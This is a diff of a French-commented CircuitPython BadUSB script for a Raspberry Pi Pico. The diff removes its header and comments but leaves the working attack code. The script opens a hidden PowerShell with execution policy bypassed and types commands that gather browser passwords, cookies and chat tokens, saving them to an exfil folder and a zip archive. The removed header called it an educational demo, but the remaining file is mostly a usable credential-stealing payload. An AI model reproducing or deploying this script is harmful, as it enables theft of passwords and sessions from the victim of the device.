@@ -1,57 +1,18 @@
 """
-Raspberry Pi Pico - BadUSB Demo 5: Vol de Credentials
-======================================================
-
-AVERTISSEMENT LÉGAL:
-Ce script est fourni à des fins éducatives et de sensibilisation uniquement.
-
-Description:
-Vol de mots de passe navigateurs, cookies, tokens
-Compatible clavier AZERTY français
-
-Durée: ~12 secondes
-Impact: CRITIQUE - Vol de credentials
-
-Ce script démontre:
-- Vol de mots de passe de TOUS les navigateurs
-- Vol de cookies (session hijacking)
-- Vol de tokens Discord/Slack/Teams
-- Exfiltration complète des credentials
-
-Données collectées:
-- Mots de passe Chrome (base Login Data)
-- Mots de passe Edge
-- Mots de passe Firefox (logins.json + clé de déchiffrement)
-- Cookies de tous les navigateurs
-- Historique de navigation
-- Données autofill (cartes de crédit potentielles)
-- Tokens Discord
-- Cookies Slack et Teams
-
 Exfiltration:
 - CIRCUITPY/exfil/ (fichiers individuels)
 - CIRCUITPY/exfil/credentials_YYYYMMDD_HHMMSS.zip
 - Desktop/CREDENTIALS_STOLEN.zip
 """
 
-# ============================================================================
-# IMPORTS
-# ============================================================================
 import time
 import usb_hid
 from adafruit_hid.keyboard import Keyboard
 from keyboard_layout_win_fr import KeyboardLayout
 from keycode_win_fr import Keycode
 
-# ============================================================================
-# INITIALISATION
-# ============================================================================
 keyboard = Keyboard(usb_hid.devices)
 layout = KeyboardLayout(keyboard)
-
-# ============================================================================
-# FONCTIONS UTILITAIRES
-# ============================================================================
 
 def press_combo(*keys):
     """Appuie sur une combinaison de touches"""
@@ -66,23 +27,15 @@ def press_enter():
     keyboard.release_all()
     time.sleep(0.3)
 
-# ============================================================================
-# SCRIPT PRINCIPAL
-# ============================================================================
-
-# Attendre la reconnaissance du périphérique
 time.sleep(2)
 
-# Étape 1: Ouvrir PowerShell INVISIBLE
 press_combo(Keycode.WINDOWS, Keycode.R)
 time.sleep(0.8)
 layout.write("powershell -W Hidden -NoP -Exec Bypass")
 press_enter()
 time.sleep(1.5)
 
-# Étape 2: Commandes de vol de credentials
 commands = [
-    # Créer dossier temporaire avec nom aléatoire
     "$out=$env:TEMP+'\\creds_'+[guid]::NewGuid().ToString().Substring(0,8);",
     "mkdir $out|Out-Null;",
     
@@ -144,8 +97,7 @@ commands = [
     "exit"
 ]
 
-# Étape 3: Exécuter les commandes de vol
 for cmd in commands:
     layout.write(cmd)
     press_enter()
-    time.sleep(0.15)  # Délai minimal
+    time.sleep(0.15)  
